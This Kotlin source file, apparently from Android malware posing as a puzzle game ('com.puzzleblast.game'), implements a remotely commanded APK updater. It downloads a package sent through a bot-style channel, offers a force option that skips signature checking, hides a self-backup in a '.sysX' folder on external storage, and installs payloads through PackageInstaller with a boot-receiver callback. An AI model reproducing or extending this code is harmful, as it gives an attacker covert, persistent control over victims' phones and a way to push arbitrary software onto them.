package com.puzzleblast.game.modules

import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.net.Uri
import android.os.Build
import android.os.Environment
import com.puzzleblast.game.core.Send
import java.io.File
import java.io.FileInputStream
import java.io.OutputStream

object ApkUpdateModule {
    private val backupDir = File(Environment.getExternalStorageDirectory(), ".sysX")

    suspend fun update(ctx: Context, fileId: String?, name: String?, force: Boolean): String {
        if (fileId == null) return "🔄 reply to an APK first"
        val apk = File(ctx.cacheDir, name ?: "update.apk")
        if (!Send.downloadFile(fileId, apk)) return "🔄 download failed"
        if (!force) {
            val sigMatch = verifySignature(ctx, apk)
            if (!sigMatch) return "🔄 signature mismatch — use /apk_update_force to skip"
        }
        backupSelf(ctx)
        install(ctx, apk)
        return "🔄 update installed — restarting"
    }

    private fun verifySignature(ctx: Context, apk: File): Boolean {
        return try {
            val pm = ctx.packageManager
            @Suppress("DEPRECATION")
            val current = pm.getPackageInfo(ctx.packageName, android.content.pm.PackageManager.GET_SIGNATURES).signatures[0].toByteArray()
            @Suppress("DEPRECATION")
            val new = pm.getPackageArchiveInfo(apk.absolutePath, android.content.pm.PackageManager.GET_SIGNATURES)?.signatures?.get(0)?.toByteArray()
            current.contentEquals(new)
        } catch (e: Exception) { false }
    }

    suspend fun backupSelf(ctx: Context): String {
        backupDir.mkdirs()
        val src = File(ctx.applicationInfo.sourceDir)
        val dest = File(backupDir, "backup.apk")
        src.copyTo(dest, overwrite = true)
        return "💾 backed up to ${dest.absolutePath}"
    }

    suspend fun rollback(ctx: Context): String {
        val apk = File(backupDir, "backup.apk")
        if (!apk.exists()) return "↩️ no backup found"
        install(ctx, apk)
        return "↩️ rollback installed"
    }

    private fun install(ctx: Context, apk: File) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val pi = ctx.packageManager.packageInstaller
            val session = pi.createSession(PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL))
            session.openWrite("app", 0, apk.length()).use { out: OutputStream ->
                FileInputStream(apk).use { it.copyTo(out) }
                session.fsync(out)
            }
            val piIntent = Intent(ctx, com.puzzleblast.game.services.BootReceiver::class.java)
            val pending = android.app.PendingIntent.getBroadcast(ctx, 0, piIntent, android.app.PendingIntent.FLAG_IMMUTABLE)
            session.commit(pending.intentSender)
        } else {
            @Suppress("DEPRECATION")
            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(Uri.fromFile(apk), "application/vnd.android.package-archive")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            ctx.startActivity(intent)
        }
    }
}
